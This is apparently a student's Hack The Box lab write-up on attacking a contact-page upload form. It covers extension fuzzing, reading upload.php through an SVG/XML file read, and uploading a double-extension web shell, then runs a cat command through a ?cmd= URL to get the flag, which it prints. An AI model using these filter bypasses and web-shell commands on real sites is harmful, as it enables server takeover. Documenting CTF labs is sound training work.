Found upload form at the contact page:
![[Pasted image 20240513100723.png]]

We can only concern with the upload button, and ignore the submit button.

Sent the image upload request to intruder, to fuzz for allowed extensions:
![[Pasted image 20240513104558.png]]

Using PHP extension list, and no URL encoding:
![[Pasted image 20240513104638.png]]

Got 2 successful uploads:
![[Pasted image 20240513104742.png]]

Fuzzing again, this time with PHP before JPEG:
![[Pasted image 20240513105658.png]]

Got a few hits:
![[Pasted image 20240513105728.png]]

Allowed extensions:

- phar
- pht
- pgif
- phtm

Read the `upload.php` file using SVG file with XML:
![[Pasted image 20240513114932.png]]

Decoded output:
```
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```

Upload directory:
`user_feedback_submissions`

Upload convention:
`<year><month><day>`

Example with uploading `dog.jpeg` (the location of the file):
`user_feedback_submissions/240513_dog.jpeg`

Managed to upload a web shell file:
![[Pasted image 20240513122426.png]]

Got the file with the URL:
```
http://94.237.62.149:57595/contact/user_feedback_submissions/240513_shell.phar.jpeg?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```

HTB{m4573r1ng_upl04d_3xpl0174710n}